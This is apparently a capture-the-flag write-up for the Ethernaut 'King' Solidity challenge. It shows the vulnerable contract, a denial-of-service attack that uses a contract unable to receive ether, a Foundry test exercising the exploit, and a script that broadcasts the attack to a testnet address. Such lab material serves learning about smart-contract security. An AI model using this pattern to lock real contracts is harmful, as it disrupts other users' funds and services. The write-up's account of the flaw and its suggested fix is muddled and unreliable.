## 🎯 Objective:

- This contract's objective is to get the title of King for Eternity. 

--- 

## 📄 Contracts Overview

## King

- This contract have 3 important variable and 1 constructor.
	- `king`: private visibility
	- `prize`: public visibility
	- `owner`: public visibility
	- `Constructor` : It passes all three variables as initial for this contract
	
	```solidity
	address king;
	uint256 public prize;
	address public owner;
	
	constructor() payable {
		owner = msg.sender;
		king = msg.sender;
		prize = msg.value;
	}
	```

--- 
## 🧠 Vulnerability: King

- The core vulnerability of this contract is the use of a  state variable in place of global variable `msg.sender`.

```solidity 
receive() external payable {
	require(msg.value >= prize || msg.sender == owner);
	payable(king).transfer(msg.value);
	king = msg.sender;
	prize = msg.value;	
}
```
- This Contract's `receive` function is vulnerable as a state variable is been misused in place of a standard global variable which force this contract to be vulnerable for `DoS` attack.

---

## Attack Flow:

- To exploit this contract the attacker must have a good understanding of state variable and global variable. And must know how contracts receive's ether.
```attack
Attacker made a contract that only sendes ether but there is niether reveive nor fallback function.
|
V
When the empty contract sends ether to the King contract, it trigger
payable(king).transfer(msg.value);
but the issue is here the caller of this contract is a contract with no receive functions.
|
V
So it wont proceed further and make the king to the Attack contract and crash the king contract Functionality.

```
- if the code used msg.sender instead of the state variable then this contract will not vulnerable to the DoS attack.
```solidity
payable(msg.sender).transfer(msg.value);
```
- this will send the ether back to the address from where it receives the ether

--- 

## 🧪 Test - TestKing.t.sol


| TestName                               | WhatitChecks                                                                                                                                          |
| -------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| `testKingChangedIfCalledByaUSER`       | It checks whether the king changes If the a user sends ether to the `King` contract. Where the amount of `ether` is greater than the previous sender. |
| `testIfKingChangedifCalledByaContract` | It checks the `king` should not changed if a contract without any receive function{`attack contract}` sends ether to the `King` contract.             |

### Key exploit(in test):

```solidity
//Arrange 2
vm.deal(address(attack), 10 ether);
vm.startPrank(address(attack));
//Act 2
(bool success1,) = address(kingContract).call{value: 6 ether}("");
require(success1, "New King Failed TO throne");
vm.stopPrank();
//Assert 2
assertEq(kingContract._king(), address(attack));
assertEq(kingContract.prize(), 6 ether);


//Arrange 3
vm.startPrank(ghost);
//Act 3
vm.expectRevert();
(bool success2,) = address(kingContract).call{value: 7 ether}("");
require(success2, "New King2 Failed To Throne");
vm.stopPrank();
//Assert 3
assertEq(kingContract._king(), address(attack));
assertEq(kingContract.prize(),6 ether);
```

- The key exploit in this test file is:
	
	-  When the empty contract sends ether to the King contract, it trigger payable(king).transfer(msg.value);
	- but the issue is here the caller of this contract is a contract with no receive functions.
	- So it wont proceed further and make the king to the Attack contract and crash the king contract Functionality.

---

## 🚀 On-Chain - AttackKingScript.s.sol

```solidity
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;
import {King} from "../src/King.sol";
import {AttackKing} from "../src/AttackKing.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackKingScript is Script {

	address public target = 0x2E02e99B97b922811dCa50387BA2B469FFEB42a8;
	AttackKing public attack;
	function run() external{
	vm.startBroadcast();
	attack = new AttackKing();
	attack.calltheKingFunction{value:0.01 ether}(target);
	console.log("New King is Crowned");
	vm.stopBroadcast();
	}
}
```
- This Script:
	- It sends some ether to the king contract which is called by the attack contract.

--- 
## 🛠️ How to Run

### Run Tests(Local Anvil)

```bash
forge test --mt testKingChangedIfCalledByaUSER -vvvv
```

### Deploy & Attack (On-chain)
```bash 
forge script script/AttackKingScript.s.sol --rpc-url $RPC_SEPOLLIA_URL --private-key $PRIVATE_KEY --broadcast
```

---
## 📁 Project Structure

```
├── src/
│   └──King.sol
|	└──AttackKing.sol        # calltheKingFunction
├── script/
│   ├── DeployScrip.s.sol
│   └── AttackKingScript.s.sol
└── test/
    └── TestKing.t.sol
```